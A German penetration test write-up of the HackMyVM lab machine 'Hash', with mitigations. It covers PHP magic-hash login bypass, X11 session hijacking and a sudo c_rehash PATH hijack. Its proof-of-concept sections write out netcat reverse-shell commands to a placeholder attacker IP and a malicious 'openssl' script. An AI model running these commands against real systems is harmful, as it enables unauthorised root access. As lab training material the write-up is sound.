# Hash (HackMyVM) - Penetration Test Bericht

![Hash.png](Hash.png)

**Datum des Berichts:** 13. Oktober 2022  
**VM:** Hash  
**Plattform:** HackMyVM ([Link zur VM](https://hackmyvm.eu/machines/machine.php?vm=Hash))  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Hash_HackMyVM_Hard/](https://alientec1908.github.io/Hash_HackMyVM_Hard/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration & Credential Discovery (PHP Type Juggling)](#phase-2-web-enumeration--credential-discovery-php-type-juggling)
5.  [Phase 3: Initial Access (SSH als marco)](#phase-3-initial-access-ssh-als-marco)
6.  [Phase 4: Privilege Escalation (marco -> maria via X11 Hijacking)](#phase-4-privilege-escalation-marco---maria-via-x11-hijacking)
7.  [Phase 5: Privilege Escalation (maria -> root via Sudo/PATH Hijacking)](#phase-5-privilege-escalation-maria---root-via-sudopath-hijacking)
8.  [Proof of Concept: PHP Type Juggling](#proof-of-concept-php-type-juggling)
9.  [Proof of Concept: c_rehash PATH Hijacking](#proof-of-concept-c_rehash-path-hijacking)
10. [Flags](#flags)
11. [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht beschreibt die Kompromittierung der virtuellen Maschine "Hash" von HackMyVM (Schwierigkeitsgrad: Schwer). Der initiale Zugriff wurde durch Ausnutzung einer PHP Type Juggling Schwachstelle in einem Web-Skript (`/check.php`) erlangt. Dies ermöglichte die Extraktion eines privaten SSH-Schlüssels für den Benutzer `marco`. Die erste Privilegieneskalation erfolgte vom Benutzer `marco` zum Benutzer `maria` durch X11 Session Hijacking, begünstigt durch unsichere Berechtigungen der `.Xauthority`-Datei und die Möglichkeit, diese in Marias Home-Verzeichnis zu kopieren. Die finale Eskalation zu Root-Rechten wurde durch Ausnutzung einer unsicheren `sudo`-Regel für das Skript `/usr/bin/c_rehash` erreicht, welche durch PATH Hijacking ausgenutzt werden konnte.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `enum4linux` (versucht, erfolglos)
*   `gobuster`
*   `wget`
*   `cat`
*   `wfuzz` (versucht, erfolglos)
*   `curl` (implizit für POST-Request)
*   `base64` (implizit für SSH-Schlüssel)
*   `vi`
*   `chmod`
*   `ssh`
*   `ls`
*   `cp`
*   `rdesktop`
*   `xterm`
*   `id`
*   `python3`
*   `ssh-keygen` (implizit)
*   `sudo`
*   `c_rehash`
*   `nc (netcat)`
*   `echo`

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan (Initial):**
    *   `arp-scan -l` identifizierte initial `192.168.2.146`. Die weitere Analyse fokussierte sich auf `192.168.2.110`, die als Ziel-IP angenommen wurde.

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -A 192.168.2.110 -p-`) auf `192.168.2.110` offenbarte:
        *   **Port 22 (SSH):** OpenSSH 7.9p1 Debian 10+deb10u2
        *   **Port 80 (HTTP):** nginx 1.14.2
        *   **Port 3389 (RDP):** `xrdp` (Microsoft Remote Desktop Protocol Server)
    *   Der `enum4linux`-Versuch war erfolglos, da keine SMB-Ports offen waren.

---

## Phase 2: Web Enumeration & Credential Discovery (PHP Type Juggling)

1.  **Verzeichnis-Enumeration:**
    *   `gobuster dir -u http://192.168.2.110 -w [...]` fand unter anderem:
        *   `/index.html`
        *   `/check.php`
        *   `/check.bak` (kritische Backup-Datei)

2.  **Analyse der Backup-Datei:**
    *   `wget http://192.168.2.110/check.bak`
    *   `cat check.bak` enthüllte den Quellcode von `check.php`:
        ```php
        //$passwordhashed = hash('md5', $pass);
        $passwordhashed = hash('sha256',$pass); // Verwendet SHA256
        if ($passwordhashed == '0e0001337') { // Kritische Bedingung: Type Juggling!
        //Your code here
        }
        // [...]
        // Marco, remember to delete the .bak file
        ```
    *   **Schwachstelle:** Der Code verwendet einen losen Vergleich (`==`) des SHA256-Hashes eines eingegebenen Passworts mit dem String `'0e0001337'`. PHP interpretiert Strings, die mit `0e` beginnen und nur Ziffern enthalten, bei losen Vergleichen als wissenschaftliche Notation mit dem Wert 0.
    *   Ein Kommentar erwähnte den Benutzer `marco`.

3.  **Ausnutzung der Type Juggling Schwachstelle:**
    *   Es wurde nach einem Passwort gesucht, dessen SHA256-Hash ebenfalls mit `0e` beginnt und nur aus Ziffern besteht ("Magic Hash").
    *   `wget https://raw.githubusercontent.com/spaze/hashes/master/sha256.md` lud eine Liste solcher Hashes.
    *   Das Passwort `34250003024812` wurde identifiziert, dessen SHA256-Hash (`0e46289032038065916139621039085883773413820991920706299695051332`) die Bedingung erfüllt.
    *   Durch Senden dieses Passworts (z.B. via POST-Request) an `http://192.168.2.110/check.php` wurde der `if`-Block ausgelöst, welcher den privaten SSH-Schlüssel für den Benutzer `marco` ausgab:
        ```
        -----BEGIN OPENSSH PRIVATE KEY-----
        b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
        NhAAAAAwEAAQAAAQEAxiKdFmWJiVfVYaNGov1xuh0/nrXnNsx2s6g5IoIJrmkX+9qzt2US
        [...]
        -----END OPENSSH PRIVATE KEY-----
        ```

---

## Phase 3: Initial Access (SSH als marco)

1.  **SSH-Login:**
    *   Der erhaltene SSH-Schlüssel wurde in einer Datei (z.B. `benn.txt`) gespeichert.
    *   `chmod 600 benn.txt`
    *   `ssh -i benn.txt marco@hash.hmv` (oder `marco@192.168.2.110`)
    *   Der Login als `marco` war erfolgreich.

2.  **User Flag:**
    *   `marco@hash:~$ cat user.txt`
        ```
        hashmanready
        ```

---

## Phase 4: Privilege Escalation (marco -> maria via X11 Hijacking)

1.  **Enumeration als `marco`:**
    *   Im Home-Verzeichnis von `marco` (`/home/marco/`) wurden die Dateien `.x` und `.Xauthority` gefunden. Die Datei `.Xauthority` enthält das "Magic Cookie" für die X11-Authentifizierung.

2.  **Vorbereitung des X11 Hijackings:**
    *   Die `.Xauthority`-Datei von `marco` wurde in das Home-Verzeichnis von `maria` kopiert (dies impliziert Schreibrechte von `marco` auf `/home/maria` oder die Möglichkeit, dies zu tun):
        ```bash
        marco@hash:~$ cp .Xauthority /home/maria/.Xauthority
        ```

3.  **Durchführung des X11 Hijackings:**
    *   Eine RDP-Verbindung wurde als `marco` zum Zielsystem (`192.168.2.110`) hergestellt:
        ```bash
        rdesktop 192.168.2.110
        ```
    *   Innerhalb der RDP-Sitzung als `marco` wurde `xterm` gestartet:
        ```bash
        marco@hash:~$ xterm
        ```
    *   Aufgrund der kopierten `.Xauthority`-Datei authentifizierte sich dieser `xterm`-Prozess erfolgreich gegen die (vermutlich laufende) X11-Sitzung von `maria` und öffnete ein neues Terminalfenster mit den Rechten des Benutzers `maria`.

---

## Phase 5: Privilege Escalation (maria -> root via Sudo/PATH Hijacking)

1.  **Enumeration als `maria`:**
    *   Als `maria` (in der gehijackten `xterm`-Sitzung) wurde `sudo -l` ausgeführt:
        ```
        Matching Defaults entries for maria on hash:
            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

        User maria may run the following commands on hash:
            (ALL : ALL) NOPASSWD: /usr/bin/c_rehash
        ```
    *   **Kritische Sudo-Regel:** `maria` darf `/usr/bin/c_rehash` als jeder Benutzer (effektiv `root`) ohne Passwort ausführen. Das Skript `c_rehash` ruft intern `openssl` auf.

2.  **Vorbereitung des PATH Hijackings:**
    *   Ein Netcat-Listener wurde auf dem Angreifer-System gestartet:
        ```bash
        nc -lvnp 4444
        ```
    *   Im Home-Verzeichnis von `maria` wurde ein bösartiges Skript namens `openssl` erstellt, das eine Reverse Shell zum Angreifer aufbaut:
        ```bash
        maria@hash:~$ echo "nc -e /bin/bash [Angreifer-IP] 4444" > openssl
        maria@hash:~$ chmod +x openssl
        ```
        *(Hinweis: Ersetzen Sie `[Angreifer-IP]` mit der IP-Adresse des Angreifer-Systems)*

3.  **Ausführung des Exploits:**
    *   Der `c_rehash`-Befehl wurde mit `sudo` ausgeführt, wobei die `PATH`-Umgebungsvariable so manipuliert wurde, dass das aktuelle Verzeichnis (`.`) zuerst durchsucht wird:
        ```bash
        maria@hash:~$ sudo PATH=.:$PATH /usr/bin/c_rehash
        ```
    *   Das `c_rehash`-Skript (ausgeführt als `root`) fand und startete das bösartige `openssl`-Skript im aktuellen Verzeichnis, wodurch die Reverse Shell mit Root-Rechten ausgelöst wurde.

4.  **Root-Zugriff und Root Flag:**
    *   Der Listener empfing die Root-Shell.
    *   ```bash
      # cd /root
      # cat root.txt
      hashhater
      ```

---

## Proof of Concept: PHP Type Juggling

**Kurzbeschreibung:** Das Skript `/check.php` verwendet einen losen Vergleich (`==`) für die Passwortvalidierung. Es vergleicht den SHA256-Hash des Benutzereingabepassworts mit dem String `'0e0001337'`. PHP interpretiert Strings, die mit `0e` beginnen und nur Ziffern enthalten (wie `'0e0001337'`), als wissenschaftliche Notation mit dem numerischen Wert 0. Wenn ein Angreifer ein Passwort bereitstellt, dessen SHA256-Hash ebenfalls mit `0e` beginnt und nur Ziffern enthält (ein "Magic Hash", z.B. `34250003024812`), wird dieser Hash ebenfalls als 0 interpretiert. Der Vergleich wird zu `0 == 0`, was wahr ist und die Authentifizierung umgeht. Im Erfolgsfall gab das Skript den SSH-Privatschlüssel des Benutzers `marco` aus.

**Schritte:**
1.  Identifiziere die Type-Juggling-Bedingung im Quellcode von `check.bak`.
2.  Finde ein Passwort (z.B. `34250003024812`), dessen SHA256-Hash die "Magic Hash"-Bedingung (`0e` + Ziffern) erfüllt.
3.  Sende einen POST-Request an `/check.php` mit dem gefundenen Passwort (z.B. `curl -d "password=34250003024812" http://192.168.2.110/check.php`).
**Ergebnis:** Preisgabe des privaten SSH-Schlüssels von `marco`.

---

## Proof of Concept: c_rehash PATH Hijacking

**Kurzbeschreibung:** Der Benutzer `maria` kann `/usr/bin/c_rehash` als `root` ohne Passwort ausführen. Das `c_rehash`-Skript ruft intern das `openssl`-Binary ohne Angabe eines absoluten Pfades auf. Ein Angreifer als `maria` kann ein bösartiges Skript namens `openssl` in einem von ihm kontrollierten Verzeichnis (z.B. `/home/maria`) erstellen, das einen Payload (z.B. eine Reverse Shell) enthält. Durch Manipulation der `PATH`-Umgebungsvariable (`sudo PATH=.:$PATH /usr/bin/c_rehash`) wird das `c_rehash`-Skript dazu veranlasst, das bösartige `openssl`-Skript anstelle des legitimen System-Binaries auszuführen, und zwar mit Root-Rechten.

**Schritte:**
1.  Erstelle ein bösartiges `openssl`-Skript mit Shell-Payload (z.B. in `/home/maria`): `echo '#!/bin/bash\nnc -e /bin/bash [Angreifer-IP] [Port]' > openssl`.
2.  Mache es ausführbar: `chmod +x openssl`.
3.  Starte einen Listener auf dem Angreifer-System: `nc -lvnp [Port]`.
4.  Führe den Sudo-Befehl mit manipuliertem PATH aus: `sudo PATH=.:$PATH /usr/bin/c_rehash`.
**Ergebnis:** Eine Reverse Shell mit Root-Rechten verbindet sich zum Listener.

---

## Flags

*   **User Flag (`/home/marco/user.txt`):**
    ```
    hashmanready
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    hashhater
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **PHP Type Juggling:**
    *   Verwenden Sie **strikte Vergleiche (`===`)** in PHP, insbesondere bei Authentifizierungs- und Sicherheitsprüfungen.
    *   Überprüfen und validieren Sie Datentypen sorgfältig.
    *   Entfernen Sie sensible Backup-Dateien (wie `.bak`) aus öffentlich zugänglichen Web-Verzeichnissen und blockieren Sie den Zugriff auf solche Dateiendungen serverseitig.
*   **SSH-Sicherheit:**
    *   Im Falle einer Kompromittierung von SSH-Schlüsseln müssen diese umgehend ausgetauscht und gesperrt werden.
    *   Stellen Sie sicher, dass private Schlüssel niemals über Webanwendungen oder andere unsichere Kanäle preisgegeben werden.
*   **X11 Session Hijacking:**
    *   Konfigurieren Sie die Berechtigungen für Home-Verzeichnisse und insbesondere für `.Xauthority`-Dateien restriktiv (idealerweise `chmod 600`, nur für den Eigentümer les- und schreibbar).
    *   Vermeiden Sie Konfigurationen, die es Benutzern erlauben, in die Home-Verzeichnisse anderer Benutzer zu schreiben.
    *   Sichern Sie X11-Forwarding und -Zugriff entsprechend ab, wenn RDP oder andere Fernzugriffsmethoden mit X11-Integration verwendet werden.
*   **Sudo und PATH Hijacking:**
    *   **Entfernen oder überarbeiten Sie unsichere Sudo-Regeln.** Spezifisch für diesen Fall: Entfernen Sie die `NOPASSWD`-Regel für `c_rehash` für den Benutzer `maria` oder schränken Sie sie stark ein.
    *   Stellen Sie sicher, dass `secure_path` in der `sudoers`-Datei konfiguriert ist und Skripte, die über `sudo` ausgeführt werden dürfen, interne Befehle immer mit **vollem, absolutem Pfad** aufrufen, um PATH-Manipulationen zu verhindern.
*   **Allgemeine Systemhärtung:**
    *   Verwenden Sie starke, einzigartige Passwörter für alle Dienste, einschließlich RDP.
    *   Deaktivieren Sie den RDP-Dienst (`xrdp`), wenn er nicht zwingend benötigt wird.
    *   Führen Sie regelmäßige Sicherheitsüberprüfungen und Konfigurationsaudits durch.

---

**Ben C. - Cyber Security Reports**
